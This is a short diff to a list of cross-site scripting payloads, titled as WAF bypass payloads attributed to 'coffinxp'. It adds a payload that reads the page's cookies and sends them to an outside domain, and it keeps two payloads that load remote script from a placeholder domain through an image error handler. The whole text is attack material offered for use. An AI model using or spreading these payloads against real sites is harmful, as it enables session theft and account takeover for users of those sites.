@@ -1,5 +1,6 @@
 WAF Bypass payloads by coffinxp:
 
+<object onafterscriptexecute={window[‘location’]=”//dontknowsss.com/?”%2bdocument[‘cookie’]}>
 "><img/src/onerror=import('//domain/')>"@yourdomain
 013371337;ext=<img/src/onerror=import('//domain/')>
 
